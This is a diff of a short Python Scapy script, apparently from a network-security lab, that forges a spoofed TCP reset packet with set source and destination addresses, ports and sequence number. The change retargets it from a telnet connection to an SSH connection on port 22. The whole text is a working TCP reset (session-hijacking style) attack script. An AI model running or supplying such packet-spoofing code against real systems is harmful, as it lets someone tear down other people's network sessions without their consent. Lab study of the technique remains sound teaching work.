@@ -2,11 +2,18 @@
 import sys
 from scapy.all import *
 
-print("SENDING RST PACKET.........")
+ip = IP()
+ip.src = "10.0.2.12"
+ip.dst = "10.0.2.15"
 
-IPLayer = IP(src="10.0.2.4", dst="10.0.2.15")
-TCPLayer = TCP(sport=23, dport=50860,flags="R", seq=44616454)
-pkt = IPLayer/TCPLayer
+tcp = TCP()
+tcp.sport = 44566
+tcp.dport = 22
+tcp.seq = 1143816659
+
+tcp.flags = "R"
+
+pkt = ip/tcp
 
 pkt.show()
-send(pkt, verbose=0)
+send(pkt, verbose = 0)
